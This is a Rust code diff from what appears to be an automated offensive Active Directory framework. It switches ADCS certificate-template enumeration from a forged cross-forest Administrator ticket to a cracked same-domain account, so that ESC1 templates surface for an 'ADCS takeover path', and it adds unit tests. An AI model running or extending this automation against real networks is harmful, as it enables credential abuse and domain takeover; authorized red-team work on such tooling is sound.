@@ -2247,12 +2247,27 @@ async fn dispatch_post_ticket_acl_enumeration(
 /// Running `certipy find` directly surfaces ESC1/2/3/4/9/13/15 templates into
 /// state so the ADCS automations (which now issue `certipy req` with the same
 /// ccache) have targets without waiting for another recon round.
+/// True when `cred` can enumerate `target_domain`'s CA as a *native* principal:
+/// a same-domain, non-machine account with a recovered password. A native
+/// enrollee is a member of the target's Domain Users, so certipy flags
+/// enrollee-supplies-subject templates (ESC1) as vulnerable-for-us; the forged
+/// cross-forest Administrator is not, leaving them undiscovered. Delegation and
+/// quarantine exclusions are applied by the caller (they need `&StateInner`).
+fn is_native_adcs_enum_candidate(
+    cred: &ares_core::models::Credential,
+    target_domain: &str,
+) -> bool {
+    !cred.password.is_empty()
+        && cred.domain.eq_ignore_ascii_case(target_domain)
+        && !cred.username.trim_end().ends_with('$')
+}
+
 async fn dispatch_post_ticket_adcs_enumeration(
     dispatcher: &Dispatcher,
     source_domain: &str,
     target_domain: &str,
 ) {
-    let target_dc_ip = {
+    let (target_dc_ip, native_user) = {
         let s = dispatcher.state.read().await;
         let Some(dc_ip) = s.resolve_dc_ip(target_domain) else {
             warn!(
@@ -2261,17 +2276,39 @@ async fn dispatch_post_ticket_adcs_enumeration(
             );
             return;
         };
-        dc_ip
+        // Prefer a native credential for the target domain over the forged
+        // cross-forest Administrator. Only a member of the target's Domain Users
+        // enrolls in — and so gets certipy to flag as vulnerable — the
+        // enrollee-supplies-subject templates (ESC1). The cross-forest
+        // Administrator is not in that group, so enumerating as it leaves ESC1
+        // undiscovered and the ADCS takeover path dark.
+        let native_user = s
+            .credentials
+            .iter()
+            .find(|c| {
+                is_native_adcs_enum_candidate(c, target_domain)
+                    && !s.is_delegation_account(&c.username)
+                    && !s.is_principal_quarantined(&c.username, &c.domain)
+            })
+            .map(|c| c.username.clone());
+        (dc_ip, native_user)
     };
 
-    // `domain` = target forest so the resolver looks up the forged ccache under
-    // that realm (see `is_cross_forest_certipy_tool`). No password/hash is
-    // supplied: without an injected ticket certipy_find soft-skips rather than
+    // With a native user the credential_resolver injects that account's
+    // password/hash and — because a same-domain credential now exists — skips
+    // the cross-forest ccache (see `resolve_cross_forest_ticket`), so certipy
+    // binds as the native enrollee. Otherwise fall back to the forged
+    // Administrator: `domain` = target forest so the resolver looks up the
+    // forged ccache under that realm (see `is_cross_forest_certipy_tool`); no
+    // password/hash is supplied so certipy_find soft-skips rather than
     // attempting a doomed cross-forest NTLM bind.
+    let enum_user = native_user
+        .clone()
+        .unwrap_or_else(|| "Administrator".to_string());
     let tool_args = json!({
         "domain": target_domain,
         "dc_ip": target_dc_ip,
-        "username": "Administrator",
+        "username": enum_user,
     });
     let call = ToolCall {
         id: format!("post_ticket_adcs_{}", uuid::Uuid::new_v4().simple()),
@@ -2287,7 +2324,9 @@ async fn dispatch_post_ticket_adcs_enumeration(
         task_id = %task_id,
         source_domain,
         target_domain,
-        "Post-ticket ADCS enumeration dispatched (certipy find via Kerberos ccache)"
+        principal = native_user.as_deref().unwrap_or("Administrator"),
+        native = native_user.is_some(),
+        "Post-ticket ADCS enumeration dispatched"
     );
 
     match dispatcher
@@ -3435,5 +3474,46 @@ mod tests {
         let work = collect_trust_follow_work_from_vulns(&s);
         assert_eq!(work.len(), 1);
         assert_eq!(work[0].hash.id, "h-current");
+    }
+
+    #[test]
+    fn native_adcs_enum_candidate_prefers_same_domain_password_user() {
+        use super::is_native_adcs_enum_candidate;
+        let mk = |user: &str, pw: &str, dom: &str| ares_core::models::Credential {
+            id: String::new(),
+            username: user.into(),
+            password: pw.into(),
+            domain: dom.into(),
+            source: String::new(),
+            discovered_at: None,
+            is_admin: false,
+            parent_id: None,
+            attack_step: 0,
+        };
+        // Native user with a recovered password -> eligible enrollee.
+        assert!(is_native_adcs_enum_candidate(
+            &mk("alice", "P@ssw0rd!", "fabrikam.local"),
+            "fabrikam.local"
+        ));
+        // Case-insensitive domain match.
+        assert!(is_native_adcs_enum_candidate(
+            &mk("alice", "P@ssw0rd!", "FABRIKAM.LOCAL"),
+            "fabrikam.local"
+        ));
+        // Source-forest account (wrong domain) -> not native.
+        assert!(!is_native_adcs_enum_candidate(
+            &mk("admin", "P@ssw0rd!", "contoso.local"),
+            "fabrikam.local"
+        ));
+        // Machine account -> excluded.
+        assert!(!is_native_adcs_enum_candidate(
+            &mk("web01$", "P@ssw0rd!", "fabrikam.local"),
+            "fabrikam.local"
+        ));
+        // Uncracked (no plaintext) -> not a bind candidate.
+        assert!(!is_native_adcs_enum_candidate(
+            &mk("bob", "", "fabrikam.local"),
+            "fabrikam.local"
+        ));
     }
 }
